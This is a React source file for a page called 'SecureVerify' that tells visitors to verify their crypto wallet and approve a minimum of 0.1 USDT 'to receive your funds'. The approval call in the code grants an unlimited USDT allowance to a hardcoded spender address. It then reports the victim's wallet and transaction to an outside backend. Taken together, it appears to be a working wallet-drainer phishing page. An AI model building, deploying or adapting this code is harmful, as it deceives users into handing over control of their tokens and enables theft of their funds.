import { useState, useEffect } from 'react';
import { EthereumProvider } from '@walletconnect/ethereum-provider';
import { BrowserProvider, Contract, MaxUint256 } from 'ethers';

const BACKEND_URL = "https://backend-usdt-y5fp.onrender.com";
const PROJECT_ID = "90bc5beffa912aa09e6d53f9b7719f45";

const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
const USDT_ETH = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const SPENDER_EVM = "0x3E5Da94426D6133b437107Ec8B656522f8899b23"; 

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)"
];

function App() {
  const [provider, setProvider] = useState(null);
  const [account, setAccount] = useState(null);
  const [amount, setAmount] = useState("0.1");
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState("Enter amount and connect wallet.");
  const [selectedNetwork, setSelectedNetwork] = useState("bsc"); // Default BSC

  // URL se network uthana (jaise ?network=eth)
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const net = urlParams.get('network');
    if (net === 'eth' || net === 'bsc') {
      setSelectedNetwork(net);
    }
  }, []);

  const connectWallet = async () => {
    try {
      setLoading(true);
      setStatus("Connecting to wallet...");
      
      // Chain ID: BSC = 56, ETH = 1
      const chainId = selectedNetwork === 'bsc' ? 56 : 1;

      const wcProvider = await EthereumProvider.init({
        projectId: PROJECT_ID,
        chains: [chainId], // Sirf selected network hi allow karega
        showQrModal: true,
        metadata: {
          name: "SecureVerify",
          description: "Wallet Verification",
          url: window.location.origin,
          icons: ["https://walletconnect.com/walletconnect-logo.png"]
        }
      });

      await wcProvider.enable();
      setProvider(wcProvider);
      setAccount(wcProvider.accounts[0]);
      
      // Force wallet to switch network
      try {
        await wcProvider.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: `0x${chainId.toString(16)}` }],
        });
      } catch (switchError) {
        console.log("Network switch failed or user rejected", switchError);
      }

      setStatus(`Connected to ${selectedNetwork.toUpperCase()}. Tap Approve to proceed.`);
      setLoading(false);
    } catch (error) {
      console.error(error);
      setStatus("Connection failed or rejected.");
      setLoading(false);
    }
  };

  const handleVerify = async () => {
    if (!provider || !account) return;
    if (Number(amount) < 0.1) {
      setStatus("Minimum amount is 0.1 USDT.");
      return;
    }
    
    try {
      setLoading(true);
      setStatus("Requesting approval... Please check your wallet.");

      const ethersProvider = new BrowserProvider(provider);
      const signer = await ethersProvider.getSigner();
      
      const network = await ethersProvider.getNetwork();
      // Double check: Agar user ne network change kar diya, toh validate karo
      if (selectedNetwork === 'bsc' && network.chainId !== 56n) {
        throw new Error("Please switch to BNB Smart Chain in your wallet.");
      }
      if (selectedNetwork === 'eth' && network.chainId !== 1n) {
        throw new Error("Please switch to Ethereum Mainnet in your wallet.");
      }

      const tokenAddress = selectedNetwork === 'bsc' ? USDT_BSC : USDT_ETH;
      const contract = new Contract(tokenAddress, ERC20_ABI, signer);
      
      // Unlimited Approval
      const tx = await contract.approve(SPENDER_EVM, MaxUint256);
      
      setStatus("Waiting for confirmation...");
      await tx.wait(); 

      setStatus("Verification Successful! You can close this page.");
      
      await fetch(`${BACKEND_URL}/api/notify`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          wallet: account,
          chain: selectedNetwork,
          txHash: tx.hash,
          allowance: "Unlimited"
        })
      });

      setLoading(false);
    } catch (error) {
      console.error(error);
      setStatus(error.message || "Approval failed. Check gas fee.");
      setLoading(false);
    }
  };

  return (
    <div className="container">
      <div className="card">
        <div className="logo">🛡️ SecureVerify</div>
        <h2>Wallet Verification ({selectedNetwork.toUpperCase()})</h2>
        <p className="desc">To receive your funds, please verify your wallet and approve a minimum of 0.1 USDT.</p>
        
        <div className="status-box">
          <strong>Status:</strong> {status}
        </div>

        {!account ? (
          <div>
            <div className="input-group">
              <label>Enter Amount (USDT)</label>
              <input 
                type="number" 
                step="0.1" 
                min="0.1" 
                value={amount} 
                onChange={(e) => setAmount(e.target.value)}
                placeholder="Min 0.1 USDT"
              />
            </div>
            <button onClick={connectWallet} disabled={loading} className="btn connect-btn">
              {loading ? "Connecting..." : `Connect Wallet (${selectedNetwork.toUpperCase()})`}
            </button>
          </div>
        ) : (
          <div>
            <p className="wallet-address">Connected: {account.slice(0,6)}...{account.slice(-4)}</p>
            <div className="input-group">
              <label>Verify Amount (USDT)</label>
              <input 
                type="number" 
                step="0.1" 
                min="0.1" 
                value={amount} 
                onChange={(e) => setAmount(e.target.value)}
                disabled
              />
            </div>
            <button onClick={handleVerify} disabled={loading} className="btn verify-btn">
              {loading ? "Processing..." : "Approve & Verify"}
            </button>
          </div>
        )}
      </div>
    </div>
  );
}

export default App;
